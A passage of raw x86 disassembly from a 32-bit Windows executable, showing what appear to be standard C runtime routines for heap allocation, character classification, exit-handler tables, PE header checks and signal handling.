  407212:	mov    ecx,DWORD PTR [ebp+0x14]
  407215:	mov    edx,eax
  407217:	dec    edx
  407218:	cmp    WORD PTR [ecx],0x0
  40721c:	je     0x407227
  40721e:	inc    ecx
  40721f:	inc    ecx
  407220:	test   edx,edx
  407222:	jne    0x407217
  407224:	or     edx,0xffffffff
  407227:	sub    eax,edx
  407229:	dec    eax
  40722a:	push   DWORD PTR [ebp+0x20]
  40722d:	push   DWORD PTR [ebp+0x1c]
  407230:	push   eax
  407231:	push   DWORD PTR [ebp+0x14]
  407234:	push   DWORD PTR [ebp+0x10]
  407237:	push   DWORD PTR [ebp+0xc]
  40723a:	call   DWORD PTR ds:0x40b06c
  407240:	cmp    BYTE PTR [ebp-0x4],0x0
  407244:	je     0x40724d
  407246:	mov    ecx,DWORD PTR [ebp-0x8]
  407249:	and    DWORD PTR [ecx+0x70],0xfffffffd
  40724d:	leave  
  40724e:	ret    
  40724f:	mov    edi,edi
  407251:	push   ebp
  407252:	mov    ebp,esp
  407254:	mov    eax,0xffff
  407259:	sub    esp,0x14
  40725c:	cmp    WORD PTR [ebp+0x8],ax
  407260:	jne    0x407268
  407262:	and    DWORD PTR [ebp-0x4],0x0
  407266:	jmp    0x4072cd
  407268:	mov    eax,0x100
  40726d:	cmp    WORD PTR [ebp+0x8],ax
  407271:	jae    0x40728d
  407273:	movzx  eax,WORD PTR [ebp+0x8]
  407277:	mov    ecx,DWORD PTR ds:0x40eca4
  40727d:	mov    ax,WORD PTR [ecx+eax*2]
  407281:	and    ax,WORD PTR [ebp+0xc]
  407285:	movzx  eax,ax
  407288:	mov    DWORD PTR [ebp-0x4],eax
  40728b:	jmp    0x4072cd
  40728d:	push   DWORD PTR [ebp+0x10]
  407290:	lea    ecx,[ebp-0x14]
  407293:	call   0x402290
  407298:	mov    eax,DWORD PTR [ebp-0x14]
  40729b:	push   DWORD PTR [eax+0x14]
  40729e:	push   DWORD PTR [eax+0x4]
  4072a1:	lea    eax,[ebp-0x4]
  4072a4:	push   eax
  4072a5:	push   0x1
  4072a7:	lea    eax,[ebp+0x8]
  4072aa:	push   eax
  4072ab:	lea    eax,[ebp-0x14]
  4072ae:	push   0x1
  4072b0:	push   eax
  4072b1:	call   0x409c15
  4072b6:	add    esp,0x1c
  4072b9:	test   eax,eax
  4072bb:	jne    0x4072c0
  4072bd:	and    DWORD PTR [ebp-0x4],eax
  4072c0:	cmp    BYTE PTR [ebp-0x8],0x0
  4072c4:	je     0x4072cd
  4072c6:	mov    eax,DWORD PTR [ebp-0xc]
  4072c9:	and    DWORD PTR [eax+0x70],0xfffffffd
  4072cd:	movzx  eax,WORD PTR [ebp-0x4]
  4072d1:	movzx  ecx,WORD PTR [ebp+0xc]
  4072d5:	and    eax,ecx
  4072d7:	leave  
  4072d8:	ret    
  4072d9:	push   0xc
  4072db:	push   0x40c8b8
  4072e0:	call   0x403b74
  4072e5:	and    DWORD PTR [ebp-0x1c],0x0
  4072e9:	mov    esi,DWORD PTR [ebp+0x8]
  4072ec:	cmp    esi,DWORD PTR ds:0x411414
  4072f2:	ja     0x407316
  4072f4:	push   0x4
  4072f6:	call   0x4066fe
  4072fb:	pop    ecx
  4072fc:	and    DWORD PTR [ebp-0x4],0x0
  407300:	push   esi
  407301:	call   0x406f13
  407306:	pop    ecx
  407307:	mov    DWORD PTR [ebp-0x1c],eax
  40730a:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  407311:	call   0x40731f
  407316:	mov    eax,DWORD PTR [ebp-0x1c]
  407319:	call   0x403bb9
  40731e:	ret    
  40731f:	push   0x4
  407321:	call   0x406624
  407326:	pop    ecx
  407327:	ret    
  407328:	mov    edi,edi
  40732a:	push   ebp
  40732b:	mov    ebp,esp
  40732d:	push   esi
  40732e:	mov    esi,DWORD PTR [ebp+0x8]
  407331:	cmp    esi,0xffffffe0
  407334:	ja     0x4073db
  40733a:	push   ebx
  40733b:	push   edi
  40733c:	mov    edi,DWORD PTR ds:0x40b078
  407342:	cmp    DWORD PTR ds:0x40f7b4,0x0
  407349:	jne    0x407363
  40734b:	call   0x402dea
  407350:	push   0x1e
  407352:	call   0x402c3f
  407357:	push   0xff
  40735c:	call   0x40298b
  407361:	pop    ecx
  407362:	pop    ecx
  407363:	mov    eax,ds:0x41244c
  407368:	cmp    eax,0x1
  40736b:	jne    0x40737b
  40736d:	test   esi,esi
  40736f:	je     0x407375
  407371:	mov    eax,esi
  407373:	jmp    0x407378
  407375:	xor    eax,eax
  407377:	inc    eax
  407378:	push   eax
  407379:	jmp    0x407397
  40737b:	cmp    eax,0x3
  40737e:	jne    0x40738b
  407380:	push   esi
  407381:	call   0x4072d9
  407386:	pop    ecx
  407387:	test   eax,eax
  407389:	jne    0x4073a1
  40738b:	test   esi,esi
  40738d:	jne    0x407390
  40738f:	inc    esi
  407390:	add    esi,0xf
  407393:	and    esi,0xfffffff0
  407396:	push   esi
  407397:	push   0x0
  407399:	push   DWORD PTR ds:0x40f7b4
  40739f:	call   edi
  4073a1:	mov    ebx,eax
  4073a3:	test   ebx,ebx
  4073a5:	jne    0x4073d5
  4073a7:	push   0xc
  4073a9:	pop    esi
  4073aa:	cmp    DWORD PTR ds:0x40f9ac,eax
  4073b0:	je     0x4073c7
  4073b2:	push   DWORD PTR [ebp+0x8]
  4073b5:	call   0x407cbb
  4073ba:	pop    ecx
  4073bb:	test   eax,eax
  4073bd:	je     0x4073ce
  4073bf:	mov    esi,DWORD PTR [ebp+0x8]
  4073c2:	jmp    0x407342
  4073c7:	call   0x4024b6
  4073cc:	mov    DWORD PTR [eax],esi
  4073ce:	call   0x4024b6
  4073d3:	mov    DWORD PTR [eax],esi
  4073d5:	pop    edi
  4073d6:	mov    eax,ebx
  4073d8:	pop    ebx
  4073d9:	jmp    0x4073ef
  4073db:	push   esi
  4073dc:	call   0x407cbb
  4073e1:	pop    ecx
  4073e2:	call   0x4024b6
  4073e7:	mov    DWORD PTR [eax],0xc
  4073ed:	xor    eax,eax
  4073ef:	pop    esi
  4073f0:	pop    ebp
  4073f1:	ret    
  4073f2:	push   0xc
  4073f4:	push   0x40c8d8
  4073f9:	call   0x403b74
  4073fe:	mov    ecx,DWORD PTR [ebp+0x8]
  407401:	xor    edi,edi
  407403:	cmp    ecx,edi
  407405:	jbe    0x407435
  407407:	push   0xffffffe0
  407409:	pop    eax
  40740a:	xor    edx,edx
  40740c:	div    ecx
  40740e:	cmp    eax,DWORD PTR [ebp+0xc]
  407411:	sbb    eax,eax
  407413:	inc    eax
  407414:	jne    0x407435
  407416:	call   0x4024b6
  40741b:	mov    DWORD PTR [eax],0xc
  407421:	push   edi
  407422:	push   edi
  407423:	push   edi
  407424:	push   edi
  407425:	push   edi
  407426:	call   0x40244e
  40742b:	add    esp,0x14
  40742e:	xor    eax,eax
  407430:	jmp    0x40750a
  407435:	imul   ecx,DWORD PTR [ebp+0xc]
  407439:	mov    esi,ecx
  40743b:	mov    DWORD PTR [ebp+0x8],esi
  40743e:	cmp    esi,edi
  407440:	jne    0x407445
  407442:	xor    esi,esi
  407444:	inc    esi
  407445:	xor    ebx,ebx
  407447:	mov    DWORD PTR [ebp-0x1c],ebx
  40744a:	cmp    esi,0xffffffe0
  40744d:	ja     0x4074b8
  40744f:	cmp    DWORD PTR ds:0x41244c,0x3
  407456:	jne    0x4074a3
  407458:	add    esi,0xf
  40745b:	and    esi,0xfffffff0
  40745e:	mov    DWORD PTR [ebp+0xc],esi
  407461:	mov    eax,DWORD PTR [ebp+0x8]
  407464:	cmp    eax,DWORD PTR ds:0x411414
  40746a:	ja     0x4074a3
  40746c:	push   0x4
  40746e:	call   0x4066fe
  407473:	pop    ecx
  407474:	mov    DWORD PTR [ebp-0x4],edi
  407477:	push   DWORD PTR [ebp+0x8]
  40747a:	call   0x406f13
  40747f:	pop    ecx
  407480:	mov    DWORD PTR [ebp-0x1c],eax
  407483:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40748a:	call   0x4074ee
  40748f:	mov    ebx,DWORD PTR [ebp-0x1c]
  407492:	cmp    ebx,edi
  407494:	je     0x4074a7
  407496:	push   DWORD PTR [ebp+0x8]
  407499:	push   edi
  40749a:	push   ebx
  40749b:	call   0x4058c0
  4074a0:	add    esp,0xc
  4074a3:	cmp    ebx,edi
  4074a5:	jne    0x407508
  4074a7:	push   esi
  4074a8:	push   0x8
  4074aa:	push   DWORD PTR ds:0x40f7b4
  4074b0:	call   DWORD PTR ds:0x40b078
  4074b6:	mov    ebx,eax
  4074b8:	cmp    ebx,edi
  4074ba:	jne    0x407508
  4074bc:	cmp    DWORD PTR ds:0x40f9ac,edi
  4074c2:	je     0x4074f7
  4074c4:	push   esi
  4074c5:	call   0x407cbb
  4074ca:	pop    ecx
  4074cb:	test   eax,eax
  4074cd:	jne    0x407445
  4074d3:	mov    eax,DWORD PTR [ebp+0x10]
  4074d6:	cmp    eax,edi
  4074d8:	je     0x40742e
  4074de:	mov    DWORD PTR [eax],0xc
  4074e4:	jmp    0x40742e
  4074e9:	xor    edi,edi
  4074eb:	mov    esi,DWORD PTR [ebp+0xc]
  4074ee:	push   0x4
  4074f0:	call   0x406624
  4074f5:	pop    ecx
  4074f6:	ret    
  4074f7:	cmp    ebx,edi
  4074f9:	jne    0x407508
  4074fb:	mov    eax,DWORD PTR [ebp+0x10]
  4074fe:	cmp    eax,edi
  407500:	je     0x407508
  407502:	mov    DWORD PTR [eax],0xc
  407508:	mov    eax,ebx
  40750a:	call   0x403bb9
  40750f:	ret    
  407510:	push   0x10
  407512:	push   0x40c8f8
  407517:	call   0x403b74
  40751c:	mov    ebx,DWORD PTR [ebp+0x8]
  40751f:	test   ebx,ebx
  407521:	jne    0x407531
  407523:	push   DWORD PTR [ebp+0xc]
  407526:	call   0x407328
  40752b:	pop    ecx
  40752c:	jmp    0x4076fd
  407531:	mov    esi,DWORD PTR [ebp+0xc]
  407534:	test   esi,esi
  407536:	jne    0x407544
  407538:	push   ebx
  407539:	call   0x402682
  40753e:	pop    ecx
  40753f:	jmp    0x4076fb
  407544:	cmp    DWORD PTR ds:0x41244c,0x3
  40754b:	jne    0x4076e4
  407551:	xor    edi,edi
  407553:	mov    DWORD PTR [ebp-0x1c],edi
  407556:	cmp    esi,0xffffffe0
  407559:	ja     0x4076e9
  40755f:	push   0x4
  407561:	call   0x4066fe
  407566:	pop    ecx
  407567:	mov    DWORD PTR [ebp-0x4],edi
  40756a:	push   ebx
  40756b:	call   0x406731
  407570:	pop    ecx
  407571:	mov    DWORD PTR [ebp-0x20],eax
  407574:	cmp    eax,edi
  407576:	je     0x40761a
  40757c:	cmp    esi,DWORD PTR ds:0x411414
  407582:	ja     0x4075cd
  407584:	push   esi
  407585:	push   ebx
  407586:	push   eax
  407587:	call   0x406c2f
  40758c:	add    esp,0xc
  40758f:	test   eax,eax
  407591:	je     0x407598
  407593:	mov    DWORD PTR [ebp-0x1c],ebx
  407596:	jmp    0x4075cd
  407598:	push   esi
  407599:	call   0x406f13
  40759e:	pop    ecx
  40759f:	mov    DWORD PTR [ebp-0x1c],eax
  4075a2:	cmp    eax,edi
  4075a4:	je     0x4075cd
  4075a6:	mov    eax,DWORD PTR [ebx-0x4]
  4075a9:	dec    eax
  4075aa:	cmp    eax,esi
  4075ac:	jb     0x4075b0
  4075ae:	mov    eax,esi
  4075b0:	push   eax
  4075b1:	push   ebx
  4075b2:	push   DWORD PTR [ebp-0x1c]
  4075b5:	call   0x4080c0
  4075ba:	push   ebx
  4075bb:	call   0x406731
  4075c0:	mov    DWORD PTR [ebp-0x20],eax
  4075c3:	push   ebx
  4075c4:	push   eax
  4075c5:	call   0x406761
  4075ca:	add    esp,0x18
  4075cd:	cmp    DWORD PTR [ebp-0x1c],edi
  4075d0:	jne    0x40761a
  4075d2:	cmp    esi,edi
  4075d4:	jne    0x4075dc
  4075d6:	xor    esi,esi
  4075d8:	inc    esi
  4075d9:	mov    DWORD PTR [ebp+0xc],esi
  4075dc:	add    esi,0xf
  4075df:	and    esi,0xfffffff0
  4075e2:	mov    DWORD PTR [ebp+0xc],esi
  4075e5:	push   esi
  4075e6:	push   edi
  4075e7:	push   DWORD PTR ds:0x40f7b4
  4075ed:	call   DWORD PTR ds:0x40b078
  4075f3:	mov    DWORD PTR [ebp-0x1c],eax
  4075f6:	cmp    eax,edi
  4075f8:	je     0x40761a
  4075fa:	mov    eax,DWORD PTR [ebx-0x4]
  4075fd:	dec    eax
  4075fe:	cmp    eax,esi
  407600:	jb     0x407604
  407602:	mov    eax,esi
  407604:	push   eax
  407605:	push   ebx
  407606:	push   DWORD PTR [ebp-0x1c]
  407609:	call   0x4080c0
  40760e:	push   ebx
  40760f:	push   DWORD PTR [ebp-0x20]
  407612:	call   0x406761
  407617:	add    esp,0x14
  40761a:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  407621:	call   0x407654
  407626:	cmp    DWORD PTR [ebp-0x20],0x0
  40762a:	jne    0x40765d
  40762c:	test   esi,esi
  40762e:	jne    0x407631
  407630:	inc    esi
  407631:	add    esi,0xf
  407634:	and    esi,0xfffffff0
  407637:	mov    DWORD PTR [ebp+0xc],esi
  40763a:	push   esi
  40763b:	push   ebx
  40763c:	push   0x0
  40763e:	push   DWORD PTR ds:0x40f7b4
  407644:	call   DWORD PTR ds:0x40b070
  40764a:	mov    edi,eax
  40764c:	jmp    0x407660
  40764e:	mov    esi,DWORD PTR [ebp+0xc]
  407651:	mov    ebx,DWORD PTR [ebp+0x8]
  407654:	push   0x4
  407656:	call   0x406624
  40765b:	pop    ecx
  40765c:	ret    
  40765d:	mov    edi,DWORD PTR [ebp-0x1c]
  407660:	test   edi,edi
  407662:	jne    0x407727
  407668:	cmp    DWORD PTR ds:0x40f9ac,edi
  40766e:	je     0x40769c
  407670:	push   esi
  407671:	call   0x407cbb
  407676:	pop    ecx
  407677:	test   eax,eax
  407679:	jne    0x407551
  40767f:	call   0x4024b6
  407684:	cmp    DWORD PTR [ebp-0x20],edi
  407687:	jne    0x4076f5
  407689:	mov    esi,eax
  40768b:	call   DWORD PTR ds:0x40b08c
  407691:	push   eax
  407692:	call   0x402474
  407697:	pop    ecx
  407698:	mov    DWORD PTR [esi],eax
  40769a:	jmp    0x4076fb
  40769c:	test   edi,edi
  40769e:	jne    0x407727
  4076a4:	call   0x4024b6
  4076a9:	cmp    DWORD PTR [ebp-0x20],edi
  4076ac:	je     0x407716
  4076ae:	mov    DWORD PTR [eax],0xc
  4076b4:	jmp    0x407727
  4076b6:	test   esi,esi
  4076b8:	jne    0x4076bb
  4076ba:	inc    esi
  4076bb:	push   esi
  4076bc:	push   ebx
  4076bd:	push   0x0
  4076bf:	push   DWORD PTR ds:0x40f7b4
  4076c5:	call   DWORD PTR ds:0x40b070
  4076cb:	mov    edi,eax
  4076cd:	test   edi,edi
  4076cf:	jne    0x407727
  4076d1:	cmp    DWORD PTR ds:0x40f9ac,eax
  4076d7:	je     0x40770d
  4076d9:	push   esi
  4076da:	call   0x407cbb
  4076df:	pop    ecx
  4076e0:	test   eax,eax
  4076e2:	je     0x407703
  4076e4:	cmp    esi,0xffffffe0
  4076e7:	jbe    0x4076b6
  4076e9:	push   esi
  4076ea:	call   0x407cbb
  4076ef:	pop    ecx
  4076f0:	call   0x4024b6
  4076f5:	mov    DWORD PTR [eax],0xc
  4076fb:	xor    eax,eax
  4076fd:	call   0x403bb9
  407702:	ret    
  407703:	call   0x4024b6
  407708:	jmp    0x407689
  40770d:	test   edi,edi
  40770f:	jne    0x407727
  407711:	call   0x4024b6
  407716:	mov    esi,eax
  407718:	call   DWORD PTR ds:0x40b08c
  40771e:	push   eax
  40771f:	call   0x402474
  407724:	mov    DWORD PTR [esi],eax
  407726:	pop    ecx
  407727:	mov    eax,edi
  407729:	jmp    0x4076fd
  40772b:	push   0x8
  40772d:	push   0x40c918
  407732:	call   0x403b74
  407737:	call   0x40386b
  40773c:	mov    eax,DWORD PTR [eax+0x78]
  40773f:	test   eax,eax
  407741:	je     0x407759
  407743:	and    DWORD PTR [ebp-0x4],0x0
  407747:	call   eax
  407749:	jmp    0x407752
  40774b:	xor    eax,eax
  40774d:	inc    eax
  40774e:	ret    
  40774f:	mov    esp,DWORD PTR [ebp-0x18]
  407752:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  407759:	call   0x409cf6
  40775e:	call   0x403bb9
  407763:	ret    
  407764:	push   0x40772b
  407769:	call   0x4035a4
  40776e:	pop    ecx
  40776f:	mov    ds:0x40f954,eax
  407774:	ret    
  407775:	mov    edi,edi
  407777:	push   ebp
  407778:	mov    ebp,esp
  40777a:	push   ecx
  40777b:	push   ebx
  40777c:	push   esi
  40777d:	push   edi
  40777e:	push   DWORD PTR ds:0x412568
  407784:	call   0x40361f
  407789:	push   DWORD PTR ds:0x412564
  40778f:	mov    edi,eax
  407791:	mov    DWORD PTR [ebp-0x4],edi
  407794:	call   0x40361f
  407799:	mov    esi,eax
  40779b:	pop    ecx
  40779c:	pop    ecx
  40779d:	cmp    esi,edi
  40779f:	jb     0x407828
  4077a5:	mov    ebx,esi
  4077a7:	sub    ebx,edi
  4077a9:	lea    eax,[ebx+0x4]
  4077ac:	cmp    eax,0x4
  4077af:	jb     0x407828
  4077b1:	push   edi
  4077b2:	call   0x409c53
  4077b7:	mov    edi,eax
  4077b9:	lea    eax,[ebx+0x4]
  4077bc:	pop    ecx
  4077bd:	cmp    edi,eax
  4077bf:	jae    0x407809
  4077c1:	mov    eax,0x800
  4077c6:	cmp    edi,eax
  4077c8:	jae    0x4077cc
  4077ca:	mov    eax,edi
  4077cc:	add    eax,edi
  4077ce:	cmp    eax,edi
  4077d0:	jb     0x4077e1
  4077d2:	push   eax
  4077d3:	push   DWORD PTR [ebp-0x4]
  4077d6:	call   0x402869
  4077db:	pop    ecx
  4077dc:	pop    ecx
  4077dd:	test   eax,eax
  4077df:	jne    0x4077f7
  4077e1:	lea    eax,[edi+0x10]
  4077e4:	cmp    eax,edi
  4077e6:	jb     0x407828
  4077e8:	push   eax
  4077e9:	push   DWORD PTR [ebp-0x4]
  4077ec:	call   0x402869
  4077f1:	pop    ecx
  4077f2:	pop    ecx
  4077f3:	test   eax,eax
  4077f5:	je     0x407828
  4077f7:	sar    ebx,0x2
  4077fa:	push   eax
  4077fb:	lea    esi,[eax+ebx*4]
  4077fe:	call   0x4035a4
  407803:	pop    ecx
  407804:	mov    ds:0x412568,eax
  407809:	push   DWORD PTR [ebp+0x8]
  40780c:	call   0x4035a4
  407811:	mov    DWORD PTR [esi],eax
  407813:	add    esi,0x4
  407816:	push   esi
  407817:	call   0x4035a4
  40781c:	pop    ecx
  40781d:	mov    ds:0x412564,eax
  407822:	mov    eax,DWORD PTR [ebp+0x8]
  407825:	pop    ecx
  407826:	jmp    0x40782a
  407828:	xor    eax,eax
  40782a:	pop    edi
  40782b:	pop    esi
  40782c:	pop    ebx
  40782d:	leave  
  40782e:	ret    
  40782f:	mov    edi,edi
  407831:	push   esi
  407832:	push   0x4
  407834:	push   0x20
  407836:	call   0x40281d
  40783b:	mov    esi,eax
  40783d:	push   esi
  40783e:	call   0x4035a4
  407843:	add    esp,0xc
  407846:	mov    ds:0x412568,eax
  40784b:	mov    ds:0x412564,eax
  407850:	test   esi,esi
  407852:	jne    0x407859
  407854:	push   0x18
  407856:	pop    eax
  407857:	pop    esi
  407858:	ret    
  407859:	and    DWORD PTR [esi],0x0
  40785c:	xor    eax,eax
  40785e:	pop    esi
  40785f:	ret    
  407860:	push   0xc
  407862:	push   0x40c938
  407867:	call   0x403b74
  40786c:	call   0x4029a3
  407871:	and    DWORD PTR [ebp-0x4],0x0
  407875:	push   DWORD PTR [ebp+0x8]
  407878:	call   0x407775
  40787d:	pop    ecx
  40787e:	mov    DWORD PTR [ebp-0x1c],eax
  407881:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  407888:	call   0x407896
  40788d:	mov    eax,DWORD PTR [ebp-0x1c]
  407890:	call   0x403bb9
  407895:	ret    
  407896:	call   0x4029ac
  40789b:	ret    
  40789c:	mov    edi,edi
  40789e:	push   ebp
  40789f:	mov    ebp,esp
  4078a1:	push   DWORD PTR [ebp+0x8]
  4078a4:	call   0x407860
  4078a9:	neg    eax
  4078ab:	sbb    eax,eax
  4078ad:	neg    eax
  4078af:	pop    ecx
  4078b0:	dec    eax
  4078b1:	pop    ebp
  4078b2:	ret    
  4078b3:	int3   
  4078b4:	int3   
  4078b5:	int3   
  4078b6:	int3   
  4078b7:	int3   
  4078b8:	int3   
  4078b9:	int3   
  4078ba:	int3   
  4078bb:	int3   
  4078bc:	int3   
  4078bd:	int3   
  4078be:	int3   
  4078bf:	int3   
  4078c0:	mov    edi,edi
  4078c2:	push   ebp
  4078c3:	mov    ebp,esp
  4078c5:	mov    ecx,DWORD PTR [ebp+0x8]
  4078c8:	mov    eax,0x5a4d
  4078cd:	cmp    WORD PTR [ecx],ax
  4078d0:	je     0x4078d6
  4078d2:	xor    eax,eax
  4078d4:	pop    ebp
  4078d5:	ret    
  4078d6:	mov    eax,DWORD PTR [ecx+0x3c]
  4078d9:	add    eax,ecx
  4078db:	cmp    DWORD PTR [eax],0x4550
  4078e1:	jne    0x4078d2
  4078e3:	xor    edx,edx
  4078e5:	mov    ecx,0x10b
  4078ea:	cmp    WORD PTR [eax+0x18],cx
  4078ee:	sete   dl
  4078f1:	mov    eax,edx
  4078f3:	pop    ebp
  4078f4:	ret    
  4078f5:	int3   
  4078f6:	int3   
  4078f7:	int3   
  4078f8:	int3   
  4078f9:	int3   
  4078fa:	int3   
  4078fb:	int3   
  4078fc:	int3   
  4078fd:	int3   
  4078fe:	int3   
  4078ff:	int3   
  407900:	mov    edi,edi
  407902:	push   ebp
  407903:	mov    ebp,esp
  407905:	mov    eax,DWORD PTR [ebp+0x8]
  407908:	mov    ecx,DWORD PTR [eax+0x3c]
  40790b:	add    ecx,eax
  40790d:	movzx  eax,WORD PTR [ecx+0x14]
  407911:	push   ebx
  407912:	push   esi
  407913:	movzx  esi,WORD PTR [ecx+0x6]
  407917:	xor    edx,edx
  407919:	push   edi
  40791a:	lea    eax,[eax+ecx*1+0x18]
  40791e:	test   esi,esi
  407920:	jbe    0x40793d
  407922:	mov    edi,DWORD PTR [ebp+0xc]
  407925:	mov    ecx,DWORD PTR [eax+0xc]
  407928:	cmp    edi,ecx
  40792a:	jb     0x407935
  40792c:	mov    ebx,DWORD PTR [eax+0x8]
  40792f:	add    ebx,ecx
  407931:	cmp    edi,ebx
  407933:	jb     0x40793f
  407935:	inc    edx
  407936:	add    eax,0x28
  407939:	cmp    edx,esi
  40793b:	jb     0x407925
  40793d:	xor    eax,eax
  40793f:	pop    edi
  407940:	pop    esi
  407941:	pop    ebx
  407942:	pop    ebp
  407943:	ret    
  407944:	int3   
  407945:	int3   
  407946:	int3   
  407947:	int3   
  407948:	int3   
  407949:	int3   
  40794a:	int3   
  40794b:	int3   
  40794c:	int3   
  40794d:	int3   
  40794e:	int3   
  40794f:	int3   
  407950:	mov    edi,edi
  407952:	push   ebp
  407953:	mov    ebp,esp
  407955:	push   0xfffffffe
  407957:	push   0x40c958
  40795c:	push   0x403bd0
  407961:	mov    eax,fs:0x0
  407967:	push   eax
  407968:	sub    esp,0x8
  40796b:	push   ebx
  40796c:	push   esi
  40796d:	push   edi
  40796e:	mov    eax,ds:0x40e004
  407973:	xor    DWORD PTR [ebp-0x8],eax
  407976:	xor    eax,ebp
  407978:	push   eax
  407979:	lea    eax,[ebp-0x10]
  40797c:	mov    fs:0x0,eax
  407982:	mov    DWORD PTR [ebp-0x18],esp
  407985:	mov    DWORD PTR [ebp-0x4],0x0
  40798c:	push   0x400000
  407991:	call   0x4078c0
  407996:	add    esp,0x4
  407999:	test   eax,eax
  40799b:	je     0x4079f2
  40799d:	mov    eax,DWORD PTR [ebp+0x8]
  4079a0:	sub    eax,0x400000
  4079a5:	push   eax
  4079a6:	push   0x400000
  4079ab:	call   0x407900
  4079b0:	add    esp,0x8
  4079b3:	test   eax,eax
  4079b5:	je     0x4079f2
  4079b7:	mov    eax,DWORD PTR [eax+0x24]
  4079ba:	shr    eax,0x1f
  4079bd:	not    eax
  4079bf:	and    eax,0x1
  4079c2:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4079c9:	mov    ecx,DWORD PTR [ebp-0x10]
  4079cc:	mov    DWORD PTR fs:0x0,ecx
  4079d3:	pop    ecx
  4079d4:	pop    edi
  4079d5:	pop    esi
  4079d6:	pop    ebx
  4079d7:	mov    esp,ebp
  4079d9:	pop    ebp
  4079da:	ret    
  4079db:	mov    eax,DWORD PTR [ebp-0x14]
  4079de:	mov    ecx,DWORD PTR [eax]
  4079e0:	mov    eax,DWORD PTR [ecx]
  4079e2:	xor    edx,edx
  4079e4:	cmp    eax,0xc0000005
  4079e9:	sete   dl
  4079ec:	mov    eax,edx
  4079ee:	ret    
  4079ef:	mov    esp,DWORD PTR [ebp-0x18]
  4079f2:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4079f9:	xor    eax,eax
  4079fb:	mov    ecx,DWORD PTR [ebp-0x10]
  4079fe:	mov    DWORD PTR fs:0x0,ecx
  407a05:	pop    ecx
  407a06:	pop    edi
  407a07:	pop    esi
  407a08:	pop    ebx
  407a09:	mov    esp,ebp
  407a0b:	pop    ebp
  407a0c:	ret    
  407a0d:	mov    edi,edi
  407a0f:	push   ebp
  407a10:	mov    ebp,esp
  407a12:	mov    eax,DWORD PTR [ebp+0x8]
  407a15:	mov    ds:0x40f958,eax
  407a1a:	mov    ds:0x40f95c,eax
  407a1f:	mov    ds:0x40f960,eax
  407a24:	mov    ds:0x40f964,eax
  407a29:	pop    ebp
  407a2a:	ret    
  407a2b:	mov    edi,edi
  407a2d:	push   ebp
  407a2e:	mov    ebp,esp
  407a30:	mov    eax,DWORD PTR [ebp+0x8]
  407a33:	mov    ecx,DWORD PTR ds:0x40e24c
  407a39:	push   esi
  407a3a:	cmp    DWORD PTR [eax+0x4],edx
  407a3d:	je     0x407a4e
  407a3f:	mov    esi,ecx
  407a41:	imul   esi,esi,0xc
  407a44:	add    esi,DWORD PTR [ebp+0x8]
  407a47:	add    eax,0xc
  407a4a:	cmp    eax,esi
  407a4c:	jb     0x407a3a
  407a4e:	imul   ecx,ecx,0xc
  407a51:	add    ecx,DWORD PTR [ebp+0x8]
  407a54:	pop    esi
  407a55:	cmp    eax,ecx
  407a57:	jae    0x407a5e
  407a59:	cmp    DWORD PTR [eax+0x4],edx
  407a5c:	je     0x407a60
  407a5e:	xor    eax,eax
  407a60:	pop    ebp
  407a61:	ret    
  407a62:	push   DWORD PTR ds:0x40f960
  407a68:	call   0x40361f
  407a6d:	pop    ecx
  407a6e:	ret    
  407a6f:	push   0x20
  407a71:	push   0x40c978
  407a76:	call   0x403b74
  407a7b:	xor    edi,edi
  407a7d:	mov    DWORD PTR [ebp-0x1c],edi
  407a80:	mov    DWORD PTR [ebp-0x28],edi
  407a83:	mov    ebx,DWORD PTR [ebp+0x8]
  407a86:	cmp    ebx,0xb
  407a89:	jg     0x407ad7
  407a8b:	je     0x407aa2
  407a8d:	mov    eax,ebx
  407a8f:	push   0x2
  407a91:	pop    ecx
  407a92:	sub    eax,ecx
  407a94:	je     0x407ab8
  407a96:	sub    eax,ecx
  407a98:	je     0x407aa2
  407a9a:	sub    eax,ecx
  407a9c:	je     0x407b02
  407a9e:	sub    eax,ecx
  407aa0:	jne    0x407ae6
  407aa2:	call   0x4037f2
  407aa7:	mov    edi,eax
  407aa9:	mov    DWORD PTR [ebp-0x28],edi
  407aac:	test   edi,edi
  407aae:	jne    0x407ac4
  407ab0:	or     eax,0xffffffff
  407ab3:	jmp    0x407c19
  407ab8:	mov    esi,0x40f958
  407abd:	mov    eax,ds:0x40f958
  407ac2:	jmp    0x407b24
  407ac4:	push   DWORD PTR [edi+0x5c]
  407ac7:	mov    edx,ebx
  407ac9:	call   0x407a2b
  407ace:	mov    esi,eax
  407ad0:	add    esi,0x8
  407ad3:	mov    eax,DWORD PTR [esi]
  407ad5:	jmp    0x407b31
  407ad7:	mov    eax,ebx
  407ad9:	sub    eax,0xf
  407adc:	je     0x407b1a
  407ade:	sub    eax,0x6
  407ae1:	je     0x407b0e
  407ae3:	dec    eax
  407ae4:	je     0x407b02
  407ae6:	call   0x4024b6
  407aeb:	mov    DWORD PTR [eax],0x16
  407af1:	xor    eax,eax
  407af3:	push   eax
  407af4:	push   eax
  407af5:	push   eax
  407af6:	push   eax
  407af7:	push   eax
  407af8:	call   0x40244e
  407afd:	add    esp,0x14
  407b00:	jmp    0x407ab0
  407b02:	mov    esi,0x40f960
  407b07:	mov    eax,ds:0x40f960
  407b0c:	jmp    0x407b24
  407b0e:	mov    esi,0x40f95c
  407b13:	mov    eax,ds:0x40f95c
  407b18:	jmp    0x407b24
  407b1a:	mov    esi,0x40f964
  407b1f:	mov    eax,ds:0x40f964
  407b24:	mov    DWORD PTR [ebp-0x1c],0x1
  407b2b:	push   eax
  407b2c:	call   0x40361f
  407b31:	mov    DWORD PTR [ebp-0x20],eax
  407b34:	pop    ecx
  407b35:	xor    eax,eax
  407b37:	cmp    DWORD PTR [ebp-0x20],0x1
  407b3b:	je     0x407c19
  407b41:	cmp    DWORD PTR [ebp-0x20],eax
  407b44:	jne    0x407b4d
  407b46:	push   0x3
  407b48:	call   0x402bbd
  407b4d:	cmp    DWORD PTR [ebp-0x1c],eax
  407b50:	je     0x407b59
  407b52:	push   eax
  407b53:	call   0x4066fe
  407b58:	pop    ecx
  407b59:	xor    eax,eax
  407b5b:	mov    DWORD PTR [ebp-0x4],eax
  407b5e:	cmp    ebx,0x8
  407b61:	je     0x407b6d
  407b63:	cmp    ebx,0xb
